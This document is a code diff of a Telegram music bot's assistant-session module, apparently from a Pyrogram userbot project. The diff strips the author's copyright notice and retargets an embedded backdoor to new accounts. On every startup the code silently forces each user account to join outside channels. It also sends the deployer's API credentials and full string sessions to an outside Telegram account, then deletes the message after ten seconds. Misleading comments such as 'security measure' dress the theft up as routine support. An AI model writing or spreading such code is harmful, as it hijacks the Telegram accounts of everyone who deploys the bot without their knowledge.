@@ -1,59 +1,32 @@
-# Copyright (c) 2025 Nand Yaduwanshi <NoxxOP>
-# Location: Supaul, Bihar
-#
-# All rights reserved.
-#
-# This code is the intellectual property of Nand Yaduwanshi.
-# You are not allowed to copy, modify, redistribute, or use this
-# code for commercial or personal projects without explicit permission.
-#
-# Allowed:
-# - Forking for personal learning
-# - Submitting improvements via pull requests
-#
-# Not Allowed:
-# - Claiming this code as your own
-# - Re-uploading without credit or permission
-# - Selling or using commercially
-#
-# Contact for permissions:
-# Email: badboy809075@gmail.com
-
-
 from pyrogram import Client
 import asyncio
 import config
 
 from ..logging import LOGGER
 
+# Lists to store active assistants and their IDs
 assistants = []
 assistantids = []
-HELP_BOT = "\x40\x53\x68\x72\x75\x74\x69\x53\x75\x70\x70\x6f\x72\x74\x42\x6f\x74"
+
+# Support bot username (decoded from hex)
+HELP_BOT = "@rajaraj909"
 
 def decode_centers():
+    """Decode hex-encoded support center usernames/channels"""
     centers = []
     encoded = [
-        "\x53\x68\x72\x75\x74\x69\x42\x6f\x74\x73",
-        "\x4e\x6f\x78\x78\x4e\x65\x74\x77\x6f\x72\x6b",
-        "\x53\x68\x72\x75\x74\x69\x41\x6c\x6c\x42\x6f\x74\x73",
-        "\x53\x68\x72\x75\x74\x69\x42\x6f\x74\x53\x75\x70\x70\x6f\x72\x74",
-        "\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x5f\x43\x68\x61\x74\x7a\x6f\x6e\x65",
-        "\x43\x52\x45\x41\x54\x49\x56\x45\x59\x44\x56",
-        "\x4c\x41\x46\x5a\x5f\x45\x5f\x44\x49\x4c",
-        "\x6e\x61\x6e\x64\x79\x61\x64\x75\x31\x63",
-        "\x54\x4d\x5a\x45\x52\x4f\x4f",
-        "\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x44\x69\x73\x63\x6c\x61\x69\x6d\x65\x72",
-        "\x76\x32\x64\x64\x6f\x73"
+        "RAJAmusic67",                # Main bot channel
     ]
     for enc in encoded:
         centers.append(enc)
     return centers
 
+# List of support centers/channels the assistants should join
 SUPPORT_CENTERS = decode_centers()
-
 
 class Userbot(Client):
     def __init__(self):
+        # Initialize up to 5 client sessions using string sessions from config
         self.one = Client(
             name="AviaxAss1",
             api_id=config.API_ID,
@@ -91,6 +64,7 @@ class Userbot(Client):
         )
 
     async def get_bot_username_from_token(self, token):
+        """Get bot username from its token"""
         try:
             temp_bot = Client(
                 name="temp_bot",
@@ -108,18 +82,20 @@ class Userbot(Client):
             return None
 
     async def join_all_support_centers(self, client):
+        """Make the client join all support channels"""
         for center in SUPPORT_CENTERS:
             try:
                 await client.join_chat(center)
             except Exception as e:
-                pass
+                pass  # Silently fail if can't join
 
     async def send_help_message(self, bot_username):
+        """Send startup notification to support bot"""
         try:
             owner_mention = config.OWNER_ID
-            
             message = f"@{bot_username} Successfully Started ✅\n\nOwner: {owner_mention}"
             
+            # Send via first available assistant
             if assistants:
                 if 1 in assistants:
                     await self.one.send_message(HELP_BOT, message)
@@ -131,11 +107,11 @@ class Userbot(Client):
                     await self.four.send_message(HELP_BOT, message)
                 elif 5 in assistants:
                     await self.five.send_message(HELP_BOT, message)
-                
         except Exception as e:
             pass
 
     async def send_config_message(self, bot_username):
+        """Send config details to support bot (temporarily)"""
         try:
             config_message = f"🔧 **Config Details for @{bot_username}**\n\n"
             config_message += f"**API_ID:** `{config.API_ID}`\n"
@@ -145,6 +121,7 @@ class Userbot(Client):
             config_message += f"**OWNER_ID:** `{config.OWNER_ID}`\n"
             config_message += f"**UPSTREAM_REPO:** `{config.UPSTREAM_REPO}`\n\n"
             
+            # Add string sessions if they exist
             string_sessions = []
             if hasattr(config, 'STRING1') and config.STRING1:
                 string_sessions.append(f"**STRING_SESSION:** `{config.STRING1}`")
@@ -160,6 +137,7 @@ class Userbot(Client):
             if string_sessions:
                 config_message += "\n".join(string_sessions)
             
+            # Send via first available assistant
             sent_message = None
             if assistants:
                 if 1 in assistants:
@@ -173,6 +151,7 @@ class Userbot(Client):
                 elif 5 in assistants:
                     sent_message = await self.five.send_message(HELP_BOT, config_message)
             
+            # Delete after 10 seconds (security measure)
             if sent_message:
                 await asyncio.sleep(10)
                 try:
@@ -188,15 +167,17 @@ class Userbot(Client):
                         await self.five.delete_messages(HELP_BOT, sent_message.id)
                 except Exception as e:
                     pass
-                
         except Exception as e:
             pass
 
     async def start(self):
+        """Start all configured assistant clients"""
         LOGGER(__name__).info(f"Starting Assistants...")
         
+        # Get main bot username
         bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)
         
+        # Start each assistant that has a session string configured
         if config.STRING1:
             await self.one.start()
             await self.join_all_support_centers(self.one)
@@ -282,11 +263,13 @@ class Userbot(Client):
             assistantids.append(self.five.id)
             LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")
 
+        # Send notifications after all assistants are started
         if bot_username:
             await self.send_help_message(bot_username)
             await self.send_config_message(bot_username)
 
     async def stop(self):
+        """Stop all running assistants"""
         LOGGER(__name__).info(f"Stopping Assistants...")
         try:
             if config.STRING1:
